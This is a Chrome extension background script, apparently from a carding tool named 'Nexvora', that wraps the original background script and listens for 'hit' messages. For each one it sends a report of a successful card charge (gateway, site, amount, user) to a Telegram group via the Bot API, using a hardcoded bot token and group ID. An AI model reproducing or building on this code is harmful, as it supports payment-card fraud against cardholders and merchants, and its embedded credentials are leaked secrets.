/**
 * Nexvora Background Wrapper (v4.0 - Direct Telegram Link)
 * Bypasses all intermediary servers for 100% reliable messaging.
 */

const BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
const GROUP_ID = '-1003721268860';

try {
    // 1. Import original background script
    importScripts('background.js');
} catch (e) {
    console.error('Nexvora: Original script import failed:', e);
}

// 2. Direct-to-Telegram Message Handler
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'NOTIFY_HIT') {
        const { card, amount, gateway, status, user_chat_id, site_name } = request.data;
        console.log('🚀 Direct Link: Detecting hit from user:', user_chat_id);

        // A. Fetch Username (Async)
        const fetchUsernameAndSend = async () => {
            let userName = 'Unknown';
            try {
                const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${user_chat_id}`);
                const chatData = await chatRes.json();
                if (chatData.ok) {
                    const chat = chatData.result;
                    userName = chat.username ? `@${chat.username}` : `${chat.first_name || ''} ${chat.last_name || ''}`.trim();
                }
            } catch (e) {
                console.warn('Could not fetch Telegram username:', e.message);
            }

            // B. Send Message to Group
            try {
                const message = `<b>HIT BDT</b>\n` +
                                `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                                `👤 <b>User:</b> ${userName} 🇧🇩\n` +
                                `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                                `↔️ <b>Gateway:</b> <code>${gateway || 'Stripe Checkout'}</code>\n` +
                                `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                                `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
                                `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
                                `<i>Checked by @hitinfobdrobot ✅</i>`;

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: GROUP_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
                        }
                    })
                });
                
                const responseData = await res.json();
                console.log('✅ Direct Telegram Response:', responseData);
                sendResponse({ ok: true, data: responseData });
            } catch (err) {
                console.error('❌ Direct Telegram Error:', err);
                sendResponse({ ok: false, error: err.message });
            }
        };

        fetchUsernameAndSend();
        return true; // Keep channel open
    }
});
